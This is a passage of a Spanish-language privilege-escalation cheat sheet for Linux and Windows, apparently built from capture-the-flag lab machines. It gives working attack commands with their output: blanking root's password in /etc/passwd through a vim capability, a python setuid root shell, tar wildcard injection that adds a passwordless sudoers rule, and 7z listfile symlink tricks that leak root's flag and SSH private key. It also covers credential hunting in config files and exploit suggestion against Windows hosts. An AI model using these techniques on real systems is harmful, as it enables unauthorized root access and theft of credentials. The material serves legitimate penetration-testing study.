_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

Finalmente nos transformamos en root, a través de los datos que asignamos por openssl:

```
┌─[user@user]─[/]
└──╼ su root
Contraseña: root

┌─[root@user]─[#]
└──╼ whoami
root
```

### Capabilities

Las capabilities son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. 

Para enumerar las capabilities debemos ejecutar el siguiente comando:

```
┌─[user@user]─[/]
└──╼ /usr/sbin/getcap -r / 2>/dev/null
```

O en algunos casos puede ser directamente esto:

```
┌─[user@user]─[/]
└──╼ getcap -r / 2>/dev/null
```

Otra opción:

```
┌─[user@user]─[/]
└──╼ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

A continuación, se presenta una tabla que destaca las capabilities que requieren especial atención, ya que pueden ser utilizadas para escalar privilegios.

| Capacidad            | Descripción resumida |
|----------------------|----------------------|
| cap_setuid           | Permite a un proceso cambiar su ID de usuario efectivo, pudiendo obtener los privilegios de otro usuario, incluido root. |
| cap_setgid           | Permite a un proceso cambiar su ID de grupo efectivo, pudiendo obtener los privilegios de otro grupo, incluido el grupo root. |
| cap_sys_admin        | Otorga amplios privilegios administrativos, similares a los de root, como modificar configuraciones del sistema o montar sistemas de archivos. |
| cap_dac_override     | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución sobre archivos. |

Finalmente, se exponen algunos ejemplos que ilustran lo anteriormente descrito.

#### cap_dac_overrid capability en vim.basic

```
┌─[user@user]─[/]
└──╼ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Al detectar ```cap_dac_override=eip```, tenemos la capacidad de modificar un archivo del sistema.

```
┌─[user@user]─[/]
└──╼ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Si elminamos la "x" podremos usar el comando su para iniciar sesión como root sin que se solicite la contraseña. Para ello podemos realizarlo manualmente.

```
┌─[user@user]─[/]
└──╼ /usr/bin/vim.basic /etc/passwd
```

También es posible realizarlo de la siguiente forma:

```
┌─[user@user]─[/]
└──╼ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

┌─[user@user]─[/]
└──╼ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash

┌─[user@user]─[/]
└──╼ su root

# whoami
root
```

#### cap_setuid capability en python

```
┌─[user@user]─[/]
└──╼ /usr/sbin/getcap -r / 2>/dev/null

/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

En este caso se detecta ```cap_setuid=ep``` lo que nos permite que un proceso establezca su ID de usuario efectivo (SUID), lo que puede utilizarse para obtener los privilegios de otro usuario, incluido el usuario root. Para ello realizamos lo siguiente:

```
┌─[user@user]─[/]
└──╼ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

### Contraseñas en la configuración web

Se pueden encontrar credenciales válidas a través del directorio de la configuración de un servidor web:

```bash
user@linux:~/myapi/config$ grep -r -i password 2>/dev/null
grep -r -i password
environments/production/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",
environments/development/database.json:        "password": "#J!:F9Zt2u"
environments/staging/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",


user@linux:~/myapi/config$ cat environments/development/database.json
cat environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}


user@linux:~/myapi/config$ mysql -udeveloper -p
mysql -u developer -p
Enter password: #J!:F9Zt2u
```

Otra forma de buscar contraseñas es a través del siguiente comando (no muestra el contenido del archivo, solo el nombre del archivo que contiene la palabra "password"):

```bash
user@linux:~/myapi/config$ grep -RIl -i "password" . 2>/dev/null
```

### Otros archivos de configuración

En sistemas Linux, es habitual que muchos archivos de configuración sean legibles para usuarios sin privilegios, siempre que el administrador no haya aplicado restricciones adicionales. Estos archivos suelen ser especialmente valiosos, ya que describen cómo están configurados los servicios, lo que permite comprender su funcionamiento interno y detectar posibles formas de aprovechamiento. Además, no es raro que contengan información sensible, como claves, credenciales, rutas internas o referencias a archivos ubicados en directorios a los que el usuario no tiene acceso directo.

```bash
┌─[user@user]─[/]
└──╼ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

También se podría realzar la siguiente búsqueda que tiene una función similar al anterior comando:

```bash
┌─[user@user]─[/]
└──╼ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

También es importante considerar los scripts .sh, ya que en algunos casos pueden contener configuraciones sensibles, incluyendo credenciales o información crítica.

```bash
┌─[user@user]─[/]
└──╼ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```


### Paquetes vulnerables

Por medio de la lista de todos los paquetes instalados en el sistema es muy probable detectar algún servicio vulnerable por medio su versión.

```bash
┌─[user@user]─[/]
└──╼ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

### Wildcards

Los wildcard son caracteres especiales interpretados por el shell antes de ejecutar un comando y permiten representar uno o más caracteres dentro de nombres de archivos. Entre los más comunes se encuentran:

- `*`: coincide con cualquier número de caracteres.
- `?`: coincide con un solo carácter.
- `[ ]`: coincide con un carácter dentro de un conjunto definido.
- `~`: expande al directorio home del usuario (o al de otro usuario si se especifica).
- `-`: dentro de `[ ]` indica un rango de caracteres.

El uso inseguro de wildcard puede llevar a escalada de privilegios, especialmente en tareas automatizadas como cron jobs.

#### Wildcard con tar

Un ejemplo típico es `tar`, que soporta opciones como `--checkpoint` y `--checkpoint-action`. Esta última permite ejecutar una acción (incluida una ejecución tipo EXEC) cuando se alcanza un checkpoint durante la creación del archivo.

Si existe un cron job que corre como un usuario privilegiado y ejecuta algo como:

- `cd /home/user && tar -zcf /home/user/backup.tar.gz *`

el wildcard `*` expande todos los nombres de archivos del directorio y los pasa como argumentos a `tar`.

Un atacante puede crear archivos cuyos nombres sean exactamente opciones válidas de `tar` (por ejemplo, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh`). Cuando el cron job se ejecute, `tar` interpretará esos nombres como parámetros y ejecutará el comando indicado, permitiendo correr un script (`root.sh`) con privilegios elevados.

Como resultado, el script puede modificar configuraciones sensibles (por ejemplo, agregando una regla a `/etc/sudoers`) y otorgar permisos sudo sin contraseña, permitiendo luego elevar privilegios a root.

```
┌─[user@user]─[/]
└──╼ echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

┌─[user@user]─[/]
└──╼echo "" > "--checkpoint-action=exec=sh root.sh"

┌─[user@user]─[/]
└──╼ echo "" > --checkpoint=1

┌─[user@user]─[/]
└──╼ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 user        user    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 user        user    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 user        user   60 Aug 31 23:11 root.sh

┌─[user@user]─[/]
└──╼ sudo -l

Matching Defaults entries for user on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

#### Wildcard con 7z
 
Se detecta un binario con una función que comienza cambiando el directorio de trabajo a `/var/www/html`. Esto es relevante porque cualquier comando ejecutado posteriormente operará **sobre el contenido de ese directorio**, sin aplicar filtros ni validaciones adicionales. Una vez realizado el cambio de directorio, la función ejecuta un comando del sistema mediante `system()`, invocando directamente a `7za` para crear un archivo comprimido. El comando utiliza un wildcard (`*`) para incluir **todos los archivos y carpetas presentes en `/var/www/html`** dentro del backup. Debido a que la expansión del wildcard es realizada por el shell antes de que `7za` procese los argumentos, cualquier archivo existente en el directorio —incluidos aquellos creados o controlados por un usuario sin privilegios— será pasado como parámetro al comando. Esto convierte al directorio `/var/www/html` en una superficie de ataque, siempre que el usuario tenga permisos de escritura sobre él

Dado que el backup incluye todos los archivos del directorio, el siguiente paso fue verificar si el usuario tiene **permisos de escritura** sobre `/var/www/html`. Al confirmarse que el directorio es escribible, se habilita la posibilidad de **abuso de wildcard**.

Primero, se crea un archivo cuyo nombre comienza con `@`, ya que `7z` interpreta este tipo de archivo como una lista de entradas a procesar:

```
user@user:/var/www/html$ touch @root.txt
user@user:/var/www/html$ ls -al
total 16
drwxrwxrwx  4 root   user 4096 Aug 15 07:24 .
drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
-rw-rw-r--  1 user   user    0 Aug 15 07:24 @root.txt
drwxrwxr-x 12 test   test   4096 Apr  2  2024 blog
```

Al listar el contenido del directorio, se confirma que el archivo fue creado correctamente y que el usuario tiene permisos de escritura.

Luego, se crea un enlace simbólico llamado `root.txt` que apunta a un archivo sensible ubicado en un directorio no accesible directamente por el usuario:

```
user@user:/var/www/html$ ln -s /root/root.txt root.txt
user@user:/var/www/html$ ls -al
total 16
drwxrwxrwx  4 root   user 4096 Aug 15 07:25 .
drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
-rw-rw-r--  1 user   user    0 Aug 15 07:24 @root.txt
lrwxrwxrwx  1 user   user   14 Aug 15 07:25 root.txt -> /root/root.txt
drwxrwxr-x 12 test   test   4096 Apr  2  2024 blog
```

Cuando el proceso de backup es ejecutado con privilegios elevados mediante el binario vulnerable `/usr/bin/usage_management`, el comando `7z` procesa el wildcard e interpreta `@root.txt` como un archivo que contiene la lista de ficheros a comprimir.

Debido a que `root.txt` es un symlink hacia `/root/root.txt`, `7z` intenta leer su contenido. Como dicho contenido no corresponde a una lista válida de archivos, el proceso genera un error que **revela el contenido del archivo objetivo** en la salida estándar.

> symlink: archivo especial en sistemas Linux/Unix que apunta a otro archivo o directorio, funcionando como un acceso indirecto a ese recurso.

Este comportamiento permite la **lectura arbitraria de archivos protegidos**, siempre que el atacante pueda crear archivos y enlaces simbólicos en el directorio respaldado.

```
user@user:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54829972

Scanning the drive:
          
WARNING: No more files
c1863d1beddaa10a75c73c6eb9833c7b

2984 folders, 17947 files, 113878917 bytes (109 MiB)                         

Updating archive: /var/backups/project.zip

Items to compress: 20931

                                                                               
Files read from disk: 17947
Archive size: 54830114 bytes (53 MiB)

Scan WARNINGS for files and folders:

c1863d1beddaa10a75c73c6eb9833c7b : No more files
----------------
Scan WARNINGS: 1
```

##### Extracción de id_rsa

El mismo comportamiento puede explotarse para acceder a claves privadas del usuario root.

Se crea nuevamente un archivo con prefijo `@`:

```
user@user:/var/www/html$ touch @id_rsa
user@user:/var/www/html$ ls -al
total 16
drwxrwxrwx  4 root   user 4096 Aug 15 07:47 .
drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
-rw-rw-r--  1 user   user    0 Aug 15 07:47 @id_rsa
drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
lrwxrwxrwx  1 user   user   14 Aug 15 07:25 root.txt -> /root/root.txt
drwxrwxr-x 12 test   test   4096 Apr  2  2024 usage_blog
```

Posteriormente, se crea un enlace simbólico que apunta a la clave privada SSH del usuario root:

```
user@user:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
user@user:/var/www/html$ ls -al
total 16
drwxrwxrwx  4 root   user 4096 Aug 15 07:48 .
drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
lrwxrwxrwx  1 user   user   17 Aug 15 07:48 id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
lrwxrwxrwx  1 user   user   14 Aug 15 07:25 root.txt -> /root/root.txt
drwxrwxr-x 12 test   test   4096 Apr  2  2024 usage_blog
```

Al ejecutarse el backup, `7z` interpreta `@id_rsa` como un archivo de lista y termina leyendo el contenido del symlink `id_rsa`. Como el contenido no es válido para el proceso de compresión, se produce un error que expone la **clave privada SSH de root**.

## Windows

### Información del sistema

En el caso de Windows se podría realizar a través de ```systeminfo```, para así poder averiguar vulnerabilidades del sistema:

```
C:\> systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00477-001-0000421-84900
Original Install Date:     22/3/2017, 11:09:45   
System Boot Time:          29/12/2017, 3:34:21   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 88 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.085 MB
Virtual Memory: In Use:    963 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```


### Windows-Exploit-Suggester

Otra forma es por medio de [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/), el cual funciona extrayendo la información del sistema. Por ejemplo en este caso lo realizamos en ```systeminfo.txt```, para luego continuar con los siguientes pasos:

```bash
┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ nano systeminfo.txt
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          6/6/2022, 2:52:26 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.456 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.664 MB
Virtual Memory: In Use:    839 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ python2 windows-exploit-suggester.py --update 

┌─[root@kali]─[/Windows-Exploit-Suggester]
└─ ls
2021-04-16-mssb.xls  2022-05-31-mssb.xls  LICENSE.md  README.md  windows-exploit-suggester.py  systeminfo.txt

┌─[root@kali]─[/Windows-Exploit-Suggester]
└─ python2 windows-exploit-suggester.py -d 2022-05-31-mssb.xls -i systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

#### Nota

Para poder ocupar ```windows-exploit-suggester.py```, es necesario instalar lo siguiente en python2:

```bash
┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

--2022-05-31 00:48:23--  https://bootstrap.pypa.io/pip/2.7/get-pip.py
Resolving bootstrap.pypa.io (bootstrap.pypa.io)... 151.101.220.175, 2a04:4e42:34::175
Connecting to bootstrap.pypa.io (bootstrap.pypa.io)|151.101.220.175|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1908226 (1.8M) [text/x-python]
Saving to: ‘get-pip.py’

get-pip.py                    100%[==============================================>]   1.82M  --.-KB/s    in 0.07s   

2022-05-31 00:48:24 (25.5 MB/s) - ‘get-pip.py’ saved [1908226/1908226]

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ python2 get-pip.py
Collecting pip<21.0
  Using cached pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 20.3.4
    Uninstalling pip-20.3.4:
      Successfully uninstalled pip-20.3.4
Successfully installed pip-20.3.4

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ pip2 install --user xlrd==1.1.0
ollecting xlrd==1.1.0
  Downloading xlrd-1.1.0-py2.py3-none-any.whl (108 kB)
     |████████████████████████████████| 108 kB 5.8 MB/s 
Installing collected packages: xlrd
Successfully installed xlrd-1.1.0
```
Una vez realizado esto, deberías poder ocuparlo sin problemas.

### Permisos de usuario

Se pueden ver que privilegios tiene el usuario a través del siguiente comando:

```
C:\> whoami /priv
```

### Local Group

A través de ver en que grupo se encuentra el usuario se pueden encontrar vías potenciales para escalar privilegios:

```
C:\> net user <user>
```


Ejemplo:

```
C:\> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/16/2021 10:01:36 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
Al ver que el usuario está en el grupo ```Server Operators```, se encuentra una vía donde poder realizar la escalada de privilegio a través de ```binPath```.

